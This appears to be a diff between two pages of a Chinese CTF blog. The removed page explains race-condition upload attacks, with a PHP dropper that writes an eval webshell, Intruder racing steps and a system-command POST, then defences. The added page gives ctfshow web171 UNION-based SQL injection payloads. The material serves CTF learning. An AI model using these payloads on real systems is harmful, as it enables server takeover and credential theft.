@@ -19,23 +19,24 @@
   <meta name="author" content="MaskObito">
   <meta name="keywords" content="">
   
-    <meta name="description" content="条件竞争指的是程序的执行结果依赖于不受控制的事件发生的顺序或时机。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。 核心原理： 共享资源： 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个临时文件、一个状态标志、一个数据库字段、一个计数器）。  非原子操作： 对共享资源的操作不是“原子性">
+    <meta name="description" content="无过滤注入web171  闭合单引号：通过输入&#39;闭合id参数的单引号。 注入UNION查询：使用UNION SELECT获取其他数据，确保列数与原查询一致。 绕过原查询条件：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的username !&#x3D; &#39;flag&#39;限制。 注释剩余部分：使用--注释掉原SQL的剩余部分，避免语法错误。  观察">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF条件竞争漏洞">
-<meta property="og:url" content="http://maskobito.github.io/2025/02/11/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/index.html">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://maskobito.github.io/2025/01/02/CTF-sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="MaskObito">
-<meta property="og:description" content="条件竞争指的是程序的执行结果依赖于不受控制的事件发生的顺序或时机。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。 核心原理： 共享资源： 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个临时文件、一个状态标志、一个数据库字段、一个计数器）。  非原子操作： 对共享资源的操作不是“原子性">
+<meta property="og:description" content="无过滤注入web171  闭合单引号：通过输入&#39;闭合id参数的单引号。 注入UNION查询：使用UNION SELECT获取其他数据，确保列数与原查询一致。 绕过原查询条件：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的username !&#x3D; &#39;flag&#39;限制。 注释剩余部分：使用--注释掉原SQL的剩余部分，避免语法错误。  观察">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://maskobito.github.io/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png">
-<meta property="article:published_time" content="2025-02-11T13:24:54.000Z">
-<meta property="article:modified_time" content="2025-09-24T06:08:53.335Z">
+<meta property="og:image" content="http://maskobito.github.io/images/web171.jpg">
+<meta property="article:published_time" content="2025-01-02T14:54:03.000Z">
+<meta property="article:modified_time" content="2025-09-24T06:58:17.582Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF靶场">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://maskobito.github.io/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png">
+<meta name="twitter:image" content="http://maskobito.github.io/images/web171.jpg">
   
   
   
-  <title>CTF条件竞争漏洞 - MaskObito</title>
+  <title>sql注入 - MaskObito</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -170,7 +171,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/tags/" target="_self">
                 <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
+                <span>CTF</span>
               </a>
             </li>
           
@@ -182,7 +183,7 @@
             <li class="nav-item">
               <a class="nav-link" href="/about/" target="_self">
                 <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
+                <span>关于本站</span>
               </a>
             </li>
           
@@ -216,7 +217,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CTF条件竞争漏洞"></span>
+            <span id="subtitle" data-typed-text="sql注入"></span>
           
         </div>
 
@@ -227,8 +228,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-11 21:24" pubdate>
-          2025年2月11日 晚上
+        <time datetime="2025-01-02 22:54" pubdate>
+          2025年1月2日 晚上
         </time>
       </span>
     
@@ -239,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          187 字
         
       </span>
     
@@ -250,7 +251,7 @@
         
         
         
-          14 分钟
+          2 分钟
         
       </span>
     
@@ -287,89 +288,29 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CTF条件竞争漏洞</h1>
+            <h1 id="seo-header">sql注入</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>条件竞争</strong>指的是程序的<strong>执行结果依赖于不受控制的事件发生的顺序或时机</strong>。当多个线程或进程在没有适当同步机制的情况下，同时访问和操作共享资源（如文件、变量、数据库记录）时，就可能出现非预期的、错误的执行结果。</p>
-<h2 id="核心原理："><a href="#核心原理：" class="headerlink" title="核心原理："></a>核心原理：</h2><ol>
-<li><p><strong>共享资源：</strong> 存在一个多个请求&#x2F;线程&#x2F;进程都能访问的资源（例如：一个<strong>临时文件</strong>、一个状态标志、一个数据库字段、一个计数器）。</p>
-</li>
-<li><p><strong>非原子操作：</strong> 对共享资源的操作不是“原子性”的。这意味着完成操作需要多个步骤，在这些步骤之间可以被中断，让其他请求介入。</p>
-</li>
-<li><p><strong>并发访问：</strong> 攻击者能够以极高的并发度（同时或极短时间内）发送多个请求，试图让这些请求的执行流在操作共享资源的关键步骤上相互交织。</p>
-</li>
-<li><p><strong>非预期交织：</strong> 由于请求的执行顺序和时机不确定，攻击者精心构造的并发请求可能导致操作步骤以开发者未预料到的顺序执行。</p>
-</li>
-<li><p><strong>利用结果：</strong> 这种非预期的执行顺序导致程序进入一个非预期的、通常是有利于攻击者的状态（例如：绕过检查、创建非预期文件、提升权限）。</p>
-</li>
-</ol>
-<hr>
-<h2 id="文件上传-解析-执行-经典案例"><a href="#文件上传-解析-执行-经典案例" class="headerlink" title="文件上传 + 解析&#x2F;执行 (经典案例):"></a>文件上传 + 解析&#x2F;执行 (经典案例):</h2><ul>
-<li><strong>场景：</strong> 服务器允许用户上传文件。上传后，服务器会对文件进行一些检查（如检查文件类型、内容），如果检查通过，会将文件移动到一个有执行权限的目录（如 <code>uploads/</code>）；如果检查不通过，会删除该临时文件。</li>
-<li><strong>漏洞：</strong> 检查(<code>check</code>)和移动(<code>move</code>)是两个独立的操作，不是原子的。在<code>check</code>完成之后、<code>move</code>执行之前，存在一个非常短暂的时间窗口。</li>
-<li><strong>攻击：</strong><ol>
-<li>攻击者不断快速上传一个包含恶意代码（如 Webshell）的文件 <code>shell.php</code>。</li>
-<li>服务器收到上传后，将文件保存为一个<strong>临时文件名</strong>（如 <code>/tmp/tmp_upload_12345</code>）。</li>
-<li>服务器开始对这个临时文件进行检查。</li>
-<li>在检查<strong>完成之后</strong>（假设检查逻辑有漏洞被绕过，或者攻击者利用速度制造混乱），但在服务器将其<strong>移动到最终目录之前</strong>（例如 <code>uploads/shell.php</code>），攻击者以极高的并发度疯狂访问这个<strong>临时文件</strong>对应的最终预期URL（如 <code>http://target/uploads/shell.php</code>）。</li>
-<li>由于访问请求极快且大量，<strong>有可能</strong>在某个时刻，服务器刚刚完成检查认为文件合法，<strong>还没来得及移动文件</strong>，就有一个访问请求到达了Web服务器（如 Apache&#x2F;Nginx）。</li>
-<li>Web服务器尝试去 <code>uploads/</code> 目录下寻找 <code>shell.php</code>，但此时文件还在 <code>/tmp/tmp_upload_12345</code>，所以没找到，返回404。</li>
-<li><strong>但是！</strong> 如果攻击者的访问请求在服务器将临时文件移动到 <code>uploads/shell.php</code> <strong>之后</strong>才被Web服务器处理，那么Web服务器就能找到并执行这个 <code>shell.php</code> 文件，攻击者的恶意代码就执行成功了！</li>
-</ol>
-</li>
-<li><strong>关键：</strong> 攻击者通过海量的并发访问，赌那个“移动文件刚刚完成，访问请求就到达”的时机。虽然单个请求命中的概率很低，但海量请求下总有一次会成功。成功执行后，攻击者就获得了Webshell。</li>
-</ul>
-<hr>
-<h2 id="购买-兑换逻辑（有限资源或支付校验）："><a href="#购买-兑换逻辑（有限资源或支付校验）：" class="headerlink" title="购买&#x2F;兑换逻辑（有限资源或支付校验）："></a>购买&#x2F;兑换逻辑（有限资源或支付校验）：</h2><ul>
-<li><strong>场景：</strong> 用户用积分购买商品或兑换优惠券。流程是：1) 检查用户积分是否足够； 2) 如果足够，则扣除积分； 3) 发放商品&#x2F;优惠券。</li>
-<li><strong>漏洞：</strong> “检查积分”和“扣除积分”不是原子操作。</li>
-<li><strong>攻击：</strong><ol>
-<li>攻击者账户只有够买1件商品的积分。</li>
-<li>攻击者同时发送大量购买请求（比如100个）。</li>
-<li>服务器在处理第一个请求时，检查积分（足够） -&gt; 扣除积分（变为0） -&gt; 发放商品。</li>
-<li>但在处理后续的99个请求时，因为它们几乎是<strong>同时</strong>到达，服务器在<strong>扣除积分之前</strong>检查积分，看到的都是<strong>原始的、足够的积分</strong>（因为第一个请求的扣除操作可能还没写入数据库，或者读到了旧缓存）。于是服务器认为积分足够，继续执行扣除和发放操作。</li>
-<li>结果：攻击者用仅够买1件商品的积分，成功购买了100件商品。服务器积分被扣成负数，或者错误地发放了大量优惠券&#x2F;商品。</li>
-</ol>
-</li>
-</ul>
-<hr>
-<h2 id="攻击代码（假设文件名为-shell-php）："><a href="#攻击代码（假设文件名为-shell-php）：" class="headerlink" title="攻击代码（假设文件名为 shell.php）："></a>攻击代码（假设文件名为 shell.php）：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;my.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php eval($_POST[my]);?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>代码解析</strong>：</p>
+                <h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="/images/web171.jpg" srcset="/img/loading.gif" lazyload></p>
 <ol>
-<li><strong><code>fopen(&quot;my.php&quot;, &quot;w&quot;)</code></strong>  <ul>
-<li>以<strong>写入模式</strong>打开当前目录下的 <code>my.php</code> 文件（不存在则创建）。</li>
-</ul>
-</li>
-<li><strong><code>fputs(..., &#39;&lt;?php eval($_POST[1]);?&gt;&#39;)</code></strong>  <ul>
-<li>向 <code>my.php</code> 写入内容：<code>&lt;?php eval($_POST[my]);?&gt;</code>  </li>
-<li><code>eval($_POST[my])</code> 表示执行通过POST参数 <code>my</code> 传递的任意代码（例如 <code>my=system(&quot;ls&quot;)</code> 可执行系统命令）。</li>
-</ul>
-</li>
-<li><strong>整体作用</strong><br><strong>当此文件被PHP解析执行时，会在当前目录生成一个恶意Webshell文件 <code>my.php</code></strong>，攻击者通过访问 <code>my.php</code> 即可控制服务器。</li>
+<li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li>
+<li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li>
+<li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li>
+<li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li>
 </ol>
-<hr>
-<p><strong>shell.php执行后新建my.php文件并写入一句话木马，作用是当上传的shell.php被删后，后端还存有my.php中的后门，方便连接。</strong></p>
-<p>接下来抓取上传shell.php的请求包，发送到<strong>Intruder</strong>爆破模块</p>
-<p><img src="/images/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.png" srcset="/img/loading.gif" lazyload></p>
-<p>除此之外最好设置多线程重放，增加条件竞争成功的可能性。</p>
-<p>不断访问上传的<code>shell.php</code>文件，一旦有<code>200</code>状态码，说明条件竞争成功。监控脚本启动后，开始进行无限重放</p>
-<h2 id="验证攻击"><a href="#验证攻击" class="headerlink" title="验证攻击"></a>验证攻击</h2><p>访问 <code>http://ctf.com/uploads/my.php</code>，用HackBar发送POST请求：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/uploads/my.php</span> <span class="hljs-meta">HTTP/1.1</span><br>...<br>my=system(&quot;ls -al /&quot;);<br></code></pre></td></tr></table></figure>
-<p>若返回服务器目录列表，则攻击成功。</p>
-<hr>
-<h3 id="防御方案（CTF出题方向）"><a href="#防御方案（CTF出题方向）" class="headerlink" title="防御方案（CTF出题方向）"></a>防御方案（CTF出题方向）</h3><ol>
-<li><p><strong>禁用临时文件执行</strong>  </p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ /tmp/</span> &#123;<br>   <span class="hljs-attribute">deny</span> all; <span class="hljs-comment"># 禁止访问/tmp目录</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
-<li><p><strong>原子性移动操作</strong><br>使用 <code>rename()</code> 而非分步操作（Linux下移动是原子的）。</p>
-</li>
-<li><p><strong>内容二次渲染</strong><br>对图片进行压缩&#x2F;缩放，破坏嵌入的PHP代码。</p>
-</li>
-<li><p><strong>临时目录隔离</strong><br>将临时文件生成到不可访问的私有目录（如 <code>/var/upload_tmp/</code>）。</p>
-</li>
-</ol>
+<p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>布尔、时间盲注、sqlmap、堆叠注入见csdn</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cz0726/article/details/147434563?fromshare=blogdetail&sharetype=blogdetail&sharerId=147434563&sharerefer=PC&sharesource=cz0726&sharefrom=from_link">https://blog.csdn.net/cz0726/article/details/147434563?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=147434563&amp;sharerefer=PC&amp;sharesource=cz0726&amp;sharefrom=from_link</a></p>
 
                 
               </div>
@@ -378,27 +319,13 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
       
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="category-chain-item">web漏洞</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
+        <a href="/tags/CTF%E9%9D%B6%E5%9C%BA/" class="print-no-link">#CTF靶场</a>
+      
     </div>
-  
   
 </div>
 
@@ -408,8 +335,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CTF条件竞争漏洞</div>
-      <div>http://maskobito.github.io/2025/02/11/CTF条件竞争/</div>
+      <div>sql注入</div>
+      <div>http://maskobito.github.io/2025/01/02/CTF-sql注入/</div>
     </div>
     <div class="license-meta">
       
@@ -421,7 +348,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月11日</div>
+          <div>2025年1月2日</div>
         </div>
       
       
@@ -453,9 +380,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/02/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%88%E7%B2%89%E7%A2%8E/" title="缓冲区溢出与栈粉碎">
+                      <a href="/2025/01/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">缓冲区溢出与栈粉碎</span>
+                        <span class="hidden-mobile">命令执行</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -463,8 +390,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/05/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="通达">
-                        <span class="hidden-mobile">通达</span>
+                      <a href="/2024/08/24/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/" title="2024国家护网">
+                        <span class="hidden-mobile">2024国家护网</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -484,8 +411,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'http://maskobito.github.io/2025/02/11/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/';
-          this.page.identifier = '/2025/02/11/CTF%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/';
+          this.page.url = 'http://maskobito.github.io/2025/01/02/CTF-sql%E6%B3%A8%E5%85%A5/';
+          this.page.identifier = '/2025/01/02/CTF-sql%E6%B3%A8%E5%85%A5/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
